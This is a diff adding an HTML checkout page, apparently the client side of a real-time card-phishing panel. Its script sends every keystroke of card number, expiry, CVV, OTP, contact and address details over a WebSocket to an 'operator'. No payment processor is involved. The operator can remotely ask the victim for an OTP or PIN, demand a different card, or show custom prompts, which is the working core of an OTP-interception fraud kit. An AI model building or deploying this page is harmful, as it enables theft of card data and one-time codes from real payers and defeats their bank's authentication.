@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>支付页面 - 客户端实时测试</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; background: #f5f5f5; color: #333; min-height: 100vh; display: flex; }
+.sidebar { width: 280px; background: #1a1a2e; color: #fff; padding: 20px; flex-shrink: 0; display: flex; flex-direction: column; gap: 12px; }
+.sidebar h3 { color: #18d46b; font-size: 16px; }
+.log-box { flex: 1; background: #16213e; border-radius: 6px; padding: 10px; overflow-y: auto; font-size: 11px; font-family: Consolas,monospace; max-height: calc(100vh - 160px); }
+.log { padding: 2px 0; border-bottom: 1px solid #1a1a2e55; word-break: break-all; }
+.log.in { color: #18d46b; }
+.log.out { color: #f0a12d; }
+.log.err { color: #ff5d70; }
+.log.info { color: #6ec6ff; }
+.main { flex: 1; padding: 30px 60px; overflow-y: auto; }
+.payment-form { max-width: 520px; background: #fff; border-radius: 10px; padding: 32px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
+.payment-form h2 { margin-bottom: 8px; color: #1a1a2e; }
+.live-indicator { font-size: 12px; color: #18d46b; margin-bottom: 20px; display: flex; align-items: center; gap: 6px; }
+.live-dot { width: 8px; height: 8px; border-radius: 50%; background: #18d46b; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+.step-indicator { display: flex; gap: 8px; margin-bottom: 20px; }
+.step { flex: 1; text-align: center; padding: 8px 4px; border-radius: 6px; font-size: 12px; background: #eee; color: #999; cursor: pointer; transition: .2s; }
+.step.active { background: #18d46b; color: #fff; }
+.form-row { margin-bottom: 14px; }
+.form-row label { display: block; font-size: 13px; color: #666; margin-bottom: 4px; }
+.form-row input, .form-row select { width: 100%; height: 40px; border: 1px solid #ddd; border-radius: 6px; padding: 0 12px; font-size: 14px; outline: none; transition: border .2s; }
+.form-row input:focus, .form-row select:focus { border-color: #18d46b; box-shadow: 0 0 0 2px #18d46b20; }
+.form-row .hint { font-size: 11px; color: #999; margin-top: 2px; }
+.inline-2 { display: flex; gap: 12px; }
+.inline-2 .form-row { flex: 1; }
+.btn-row { margin-top: 20px; display: flex; gap: 12px; }
+.btn { height: 44px; border-radius: 8px; border: none; font-size: 15px; cursor: pointer; padding: 0 24px; font-weight: 600; transition: all .2s; }
+.btn-primary { background: #18d46b; color: #fff; flex: 1; }
+.btn-primary:hover { background: #14b85c; }
+.btn-secondary { background: #eee; color: #666; }
+.status-bar { margin-top: 16px; padding: 16px 12px; border-radius: 8px; font-size: 14px; text-align: center; position: relative; overflow: hidden; }
+.status-live { background: #e8f5e9; color: #18d46b; }
+.status-pending { background: #fff3e0; color: #f0a12d; }
+.status-pending::before {
+  content: '';
+  position: absolute;
+  top: 0; left: -100%;
+  width: 100%; height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(240,161,45,.08), transparent);
+  animation: wait-sweep 2s ease-in-out infinite;
+}
+@keyframes wait-sweep {
+  0% { left: -100%; }
+  100% { left: 100%; }
+}
+.status-rejected { background: #fce4ec; color: #ff5d70; }
+.status-approved { background: #e8f5e9; color: #119849; }
+.spinner {
+  display: inline-block;
+  width: 18px; height: 18px;
+  border: 2px solid #f0a12d;
+  border-top-color: transparent;
+  border-radius: 50%;
+  animation: spin .8s linear infinite;
+  vertical-align: middle;
+  margin-right: 8px;
+}
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+.wait-text {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 4px;
+}
+.wait-dots::after {
+  content: '';
+  animation: dots 1.5s steps(3, end) infinite;
+}
+@keyframes dots {
+  0% { content: ''; }
+  33% { content: '.'; }
+  66% { content: '..'; }
+  100% { content: '...'; }
+}
+.official-track { margin-top: 20px; padding: 16px; background: #f9f9fb; border-radius: 8px; border: 1px dashed #ddd; }
+.official-track h4 { font-size: 14px; margin-bottom: 12px; color: #888; }
+.official-track input { height: 36px; font-size: 16px; text-align: center; letter-spacing: 4px; }
+</style>
+</head>
+<body>
+<div class="sidebar">
+  <h3>WS 日志</h3>
+  <div style="display:flex;gap:8px;align-items:center;">
+    <span id="ws-status" style="color:#ff5d70;">● 断开</span>
+    <span style="font-size:11px;color:#888;">ws://localhost:9528 (same origin)</span>
+  </div>
+  <span id="pushCount" style="font-size:11px;color:#888;">推送: 0 次</span>
+  <div class="log-box" id="logBox">
+    <div class="log err">等待连接...</div>
+  </div>
+</div>
+
+<div class="main">
+  <div class="payment-form">
+    <h2>信用卡支付</h2>
+    <div class="live-indicator">
+      <span class="live-dot"></span>
+      <span>实时传输中 — 后台可看到你的每次输入</span>
+    </div>
+
+    <div class="step-indicator">
+      <div class="step" id="stepProduct" onclick="switchStep('product')">1. 商品页</div>
+      <div class="step" id="stepAddress" onclick="switchStep('address')">2. 地址页</div>
+      <div class="step active" id="stepCard" onclick="switchStep('card')">3. 卡片页</div>
+      <div class="step" id="stepOtp" onclick="switchStep('otp')">4. OTP验证</div>
+    </div>
+
+    <div id="cardFields">
+      <div class="form-row">
+        <label>持卡人姓名</label>
+        <input id="name" placeholder="JOHN DOE" oninput="pushData()">
+      </div>
+      <div class="form-row">
+        <label>卡号</label>
+        <input id="cardNumber" placeholder="4573 6201 4512 7896" maxlength="19" oninput="pushData()">
+      </div>
+      <div class="inline-2">
+        <div class="form-row">
+          <label>有效期 (MM/YY)</label>
+          <input id="expiry" placeholder="06/27" oninput="pushData()">
+        </div>
+        <div class="form-row">
+          <label>CVV</label>
+          <input id="cvv" placeholder="597" maxlength="4" oninput="pushData()">
+        </div>
+      </div>
+    </div>
+
+    <div id="addressFields" style="display:none;">
+      <div class="form-row">
+        <label>国家/地区</label>
+        <select id="country" onchange="pushData()">
+          <option value="">请选择国家</option>
+          <option value="OM">Oman</option>
+          <option value="US">United States</option>
+          <option value="CN">China</option>
+          <option value="GB">United Kingdom</option>
+          <option value="AE">UAE</option>
+          <option value="SA">Saudi Arabia</option>
+          <option value="IN">India</option>
+          <option value="PK">Pakistan</option>
+        </select>
+      </div>
+      <div class="form-row">
+        <label>姓名</label>
+        <input id="custName" placeholder="John Doe" oninput="pushData()">
+      </div>
+      <div class="form-row">
+        <label>邮箱</label>
+        <input id="email" placeholder="john@example.com" oninput="pushData()">
+      </div>
+      <div class="form-row">
+        <label>手机号</label>
+        <input id="phone" placeholder="+968 7182 9977" oninput="pushData()">
+      </div>
+      <div class="form-row"><label>地址 1</label><input id="addr1" placeholder="123 Main St" oninput="pushData()"></div>
+      <div class="form-row"><label>地址 2</label><input id="addr2" placeholder="" oninput="pushData()"></div>
+      <div class="form-row"><label>城市</label><input id="city" placeholder="Town" oninput="pushData()"></div>
+      <div class="form-row"><label>州/省</label><input id="state" placeholder="Oman" oninput="pushData()"></div>
+      <div class="form-row"><label>邮编</label><input id="zipCode" placeholder="" oninput="pushData()"></div>
+    </div>
+
+    <div id="otpSection" style="display:none;">
+      <div class="official-track">
+        <h4>📲 OTP 验证码 (管理员推送后将显示在此处)</h4>
+        <input id="otpInput" placeholder="输入收到的验证码" maxlength="6" oninput="pushData()">
+      </div>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn btn-primary" id="submitBtn" onclick="submitForReview()">提交审核</button>
+      <button class="btn btn-secondary" onclick="resetAll()">重置</button>
+    </div>
+
+    <div id="statusBar" class="status-bar status-live">
+      ● 实时传输中 — 开始输入卡信息
+    </div>
+  </div>
+</div>
+
+<script>
+const CUSTOMER_ID_KEY = 'payment_customer_id';
+let customerId = localStorage.getItem(CUSTOMER_ID_KEY);
+if (!customerId) {
+  customerId = 'cust_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+  localStorage.setItem(CUSTOMER_ID_KEY, customerId);
+}
+const WS_URL = 'ws://' + location.hostname + ':9528?role=customer&cid=' + customerId;
+
+let ws = null;
+let pushCount = 0;
+let pushTimer = null;
+let currentStep = 'card';
+let sessionCreated = false;
+let currentSessionId = null;
+const visitedSteps = new Set(['card']);
+
+const SESSION_URL = 'shop.example.com';
+
+function log(msg, type) {
+  const box = document.getElementById('logBox');
+  const div = document.createElement('div');
+  div.className = 'log ' + (type || 'out');
+  div.textContent = new Date().toLocaleTimeString() + ' ' + msg;
+  box.appendChild(div);
+  box.scrollTop = box.scrollHeight;
+}
+
+function incPush() {
+  pushCount++;
+  document.getElementById('pushCount').textContent = '推送: ' + pushCount + ' 次';
+}
+
+function setStatus(status) {
+  const el = document.getElementById('ws-status');
+  el.textContent = status === 'open' ? '● 已连接' : '● 断开';
+  el.style.color = status === 'open' ? '#18d46b' : '#ff5d70';
+}
+
+function buildSessionData() {
+  const cardHolderName = document.getElementById('name').value;
+  const custName = document.getElementById('custName').value;
+  const cardNumber = document.getElementById('cardNumber').value;
+  const phone = document.getElementById('phone').value;
+  const cleanNum = cardNumber.replace(/\s/g, '');
+  const countryCode = document.getElementById('country').value;
+  const displayName = custName || cardHolderName;
+
+  return {
+    frontendUrl: SESSION_URL,
+    cardInfo: {
+      cardNumber: cleanNum,
+      expiry: document.getElementById('expiry').value,
+      cvv: document.getElementById('cvv').value,
+      otpCode: document.getElementById('otpInput')?.value || '',
+      cardHolder: cardHolderName
+    },
+    customerInfo: {
+      firstName: displayName ? displayName.split(' ')[0] : '',
+      lastName: displayName ? displayName.split(' ').slice(1).join(' ') : '',
+      fullName: displayName || '',
+      email: document.getElementById('email').value || '',
+      phone: phone || '',
+      country: countryCode || '',
+      address1: document.getElementById('addr1')?.value || '',
+      address2: document.getElementById('addr2')?.value || '',
+      city: document.getElementById('city')?.value || '',
+      state: document.getElementById('state')?.value || ''
+    },
+    browsingTabs: getBrowsingTabs(),
+    currentStep: currentStep
+  };
+}
+
+function getBrowsingTabs() {
+  const cardFields = [
+    document.getElementById('name').value,
+    document.getElementById('cardNumber').value,
+    document.getElementById('expiry').value,
+    document.getElementById('cvv').value
+  ].filter(v => v && v.trim()).length;
+
+  const addrFields = [
+    document.getElementById('country').value,
+    document.getElementById('custName').value,
+    document.getElementById('email').value,
+    document.getElementById('phone').value,
+    document.getElementById('addr1').value,
+    document.getElementById('addr2').value,
+    document.getElementById('city').value,
+    document.getElementById('state').value,
+    document.getElementById('zipCode').value
+  ].filter(v => v && v.trim()).length;
+
+  const allTabs = [
+    { step: 'product', label: '商品页', count: 0 },
+    { step: 'address', label: '地址页', count: addrFields },
+    { step: 'card', label: '卡片页', count: cardFields },
+    { step: 'otp', label: 'OTP验证页', count: document.getElementById('otpInput')?.value ? 1 : 0 }
+  ];
+  return allTabs
+    .filter(t => visitedSteps.has(t.step) && t.count > 0)
+    .map(t => ({ label: t.label, count: t.count, active: t.step === currentStep }));
+}
+
+function pushData() {
+  if (!ws || ws.readyState !== WebSocket.OPEN) return;
+
+  clearTimeout(pushTimer);
+  pushTimer = setTimeout(() => {
+    const data = buildSessionData();
+    if (!data.cardInfo.cardNumber && !data.customerInfo.fullName && !data.customerInfo.email) return;
+
+    if (sessionCreated && currentSessionId) {
+      ws.send(JSON.stringify({
+        type: 'session_update',
+        payload: { sessionId: currentSessionId, ...data }
+      }));
+      log('更新: ' + currentStep, 'out');
+    } else {
+      ws.send(JSON.stringify({
+        type: 'customer_input',
+        payload: data
+      }));
+      log('创建: ' + currentStep, 'out');
+    }
+    incPush();
+  }, 150);
+}
+
+function submitForReview() {
+  const cardNumber = document.getElementById('cardNumber').value;
+  if (!cardNumber) {
+    alert('请先填写卡号');
+    return;
+  }
+  if (!ws || ws.readyState !== WebSocket.OPEN) return;
+  if (!sessionCreated) {
+    pushData();
+    setTimeout(() => submitForReview(), 500);
+    return;
+  }
+
+  ws.send(JSON.stringify({
+    type: 'session_update',
+    payload: { sessionId: currentSessionId, status: 'pending', ...buildSessionData() }
+  }));
+  document.getElementById('statusBar').innerHTML = '<span class=\"wait-text\"><span class=\"spinner\"></span>已提交，等待管理员审核<span class=\"wait-dots\"></span></span>';
+  document.getElementById('statusBar').className = 'status-bar status-pending';
+  log('提交审核', 'out');
+}
+
+function switchStep(step) {
+  currentStep = step;
+  visitedSteps.add(step);
+  document.getElementById('stepProduct').className = 'step' + (step === 'product' ? ' active' : '');
+  document.getElementById('stepAddress').className = 'step' + (step === 'address' ? ' active' : '');
+  document.getElementById('stepCard').className = 'step' + (step === 'card' ? ' active' : '');
+  document.getElementById('stepOtp').className = 'step' + (step === 'otp' ? ' active' : '');
+  document.getElementById('cardFields').style.display = (step === 'card' || step === 'otp') ? '' : 'none';
+  document.getElementById('addressFields').style.display = step === 'address' ? '' : 'none';
+  document.getElementById('otpSection').style.display = step === 'otp' ? '' : 'none';
+  pushData();
+  log('切到: ' + step, 'info');
+}
+
+function resetAll() {
+  sessionCreated = false;
+  currentSessionId = null;
+  currentStep = 'card';
+  visitedSteps.clear();
+  visitedSteps.add('card');
+  switchStep('card');
+  document.getElementById('country').value = '';
+  document.getElementById('statusBar').textContent = '● 实时传输中 — 开始输入卡信息';
+  document.getElementById('statusBar').className = 'status-bar status-live';
+  document.querySelectorAll('input').forEach(el => el.value = '');
+  log('已重置', 'info');
+}
+
+function connect() {
+  if (ws) { ws.close(); ws = null; }
+  let url = WS_URL;
+  if (currentSessionId) url += '&sid=' + currentSessionId;
+  ws = new WebSocket(url);
+  log('连接中...', 'err');
+
+  ws.onopen = () => {
+    setStatus('open');
+    log('已连接 — 开始输入即可实时推送', 'in');
+    if (sessionCreated && currentSessionId) {
+      pushData();
+    }
+  };
+
+  ws.onmessage = (e) => {
+    let msg;
+    try { msg = JSON.parse(e.data); } catch { return; }
+
+    switch (msg.type) {
+      case 'operator_action': {
+        const { action, message } = msg.payload || {};
+        log('管理员操作: ' + action + (message ? ' (' + message + ')' : ''), 'in');
+
+        if (action === 'ack' || action === 'session_restored') {
+          const wasRestored = (action === 'session_restored');
+          sessionCreated = true;
+          currentSessionId = msg.payload?.sessionId;
+          const restoredStatus = msg.payload?.status;
+          const cardInfo = msg.payload?.cardInfo;
+          const custInfo = msg.payload?.customerInfo;
+
+          /* Populate form fields on restore */
+          if (cardInfo) {
+            if (cardInfo.cardHolder) document.getElementById('name').value = cardInfo.cardHolder;
+            if (cardInfo.cardNumber) document.getElementById('cardNumber').value = cardInfo.cardNumber.replace(/(\d{4})/g, '$1 ');
+            if (cardInfo.expiry) document.getElementById('expiry').value = cardInfo.expiry;
+            if (cardInfo.cvv) document.getElementById('cvv').value = cardInfo.cvv;
+          }
+          if (custInfo) {
+            if (custInfo.fullName) document.getElementById('custName').value = custInfo.fullName;
+            if (custInfo.email) document.getElementById('email').value = custInfo.email;
+            if (custInfo.phone) document.getElementById('phone').value = custInfo.phone;
+            if (custInfo.country) document.getElementById('country').value = custInfo.country;
+            if (custInfo.address1) document.getElementById('addr1').value = custInfo.address1;
+            if (custInfo.address2) document.getElementById('addr2').value = custInfo.address2;
+            if (custInfo.city) document.getElementById('city').value = custInfo.city;
+            if (custInfo.state) document.getElementById('state').value = custInfo.state;
+            if (custInfo.zipCode) document.getElementById('zipCode').value = custInfo.zipCode;
+          }
+
+          if (wasRestored && restoredStatus === 'pending') {
+            /* re-show waiting state */
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('statusBar').innerHTML = '<span class=\"wait-text\"><span class=\"spinner\"></span>已提交，等待管理员审核<span class=\"wait-dots\"></span></span>';
+            document.getElementById('statusBar').className = 'status-bar status-pending';
+            document.getElementById('statusBar').style.display = 'block';
+            log('会话已恢复 (状态: pending)', 'info');
+          } else {
+            document.getElementById('submitBtn').disabled = false;
+            document.getElementById('statusBar').textContent = wasRestored ? '会话已恢复' : '会话已建立，后台正在实时查看你的输入';
+            document.getElementById('statusBar').className = 'status-bar status-live';
+            document.getElementById('statusBar').style.display = 'block';
+            log('会话ID: ' + currentSessionId + (wasRestored ? ' (已恢复)' : ''), 'info');
+          }
+          if (wasRestored) setTimeout(pushData, 200);
+        } else if (action === 'otp_verify') {
+          currentStep = 'otp';
+          switchStep('otp');
+          document.getElementById('statusBar').textContent = '管理员要求 OTP 验证';
+          setTimeout(() => { document.getElementById('otpInput').focus(); }, 200);
+        } else if (action === 'email_verify') {
+          document.getElementById('statusBar').textContent = '管理员要求邮箱验证';
+          document.getElementById('statusBar').className = 'status-bar status-pending';
+        } else if (action === 'pin_verify') {
+          document.getElementById('statusBar').textContent = '管理员要求 PIN 验证';
+          document.getElementById('statusBar').className = 'status-bar status-pending';
+        } else if (action === 'change_card') {
+          document.getElementById('statusBar').textContent = '管理员要求换卡支付';
+          document.getElementById('statusBar').className = 'status-bar status-rejected';
+          document.getElementById('submitBtn').disabled = false;
+        } else if (action === 'custom_prompt') {
+          var m = message || '请继续';
+          var el = document.createElement('div');
+          el.textContent = '📝 管理员提示: ' + m;
+          el.style.cssText = 'position:fixed;top:10px;left:50%;transform:translateX(-50%);background:#2b3045;color:#fff;padding:10px 20px;border-radius:8px;z-index:9999;font-size:14px';
+          document.body.appendChild(el);
+          setTimeout(function(){ el.remove(); }, 5000);
+        } else if (action === 'redirect_complete') {
+          document.getElementById('statusBar').textContent = '支付流程已完成';
+          document.getElementById('statusBar').className = 'status-bar status-approved';
+        } else if (action === 'approve') {
+          document.getElementById('statusBar').textContent = '✅ 支付已通过！';
+          document.getElementById('statusBar').className = 'status-bar status-approved';
+        } else if (action === 'reject') {
+          document.getElementById('statusBar').textContent = '❌ 支付被拒绝';
+          document.getElementById('statusBar').className = 'status-bar status-rejected';
+        } else if (action === 'timeout') {
+          document.getElementById('statusBar').textContent = '⏰ 操作超时，会话已取消';
+          document.getElementById('statusBar').className = 'status-bar status-rejected';
+        }
+        break;
+      }
+      case 'session_update': {
+        const { status } = msg.payload || {};
+        if (status === 'approved') { document.getElementById('statusBar').textContent = '✅ 支付已通过！'; document.getElementById('statusBar').className = 'status-bar status-approved'; }
+        else if (status === 'rejected') { document.getElementById('statusBar').textContent = '❌ 支付被拒绝'; document.getElementById('statusBar').className = 'status-bar status-rejected'; }
+        else if (status === 'cancelled') { document.getElementById('statusBar').textContent = '⏰ 会话已取消'; document.getElementById('statusBar').className = 'status-bar status-rejected'; }
+        break;
+      }
+      case 'connect_count': case 'heartbeat': break;
+      default: log('未知: ' + msg.type, 'err');
+    }
+  };
+
+  ws.onclose = () => {
+    setStatus('close');
+    log('断开，3秒后重连...', 'err');
+    setTimeout(connect, 3000);
+  };
+
+  ws.onerror = () => log('连接错误', 'err');
+}
+
+connect();
+</script>
+</body>
+</html>
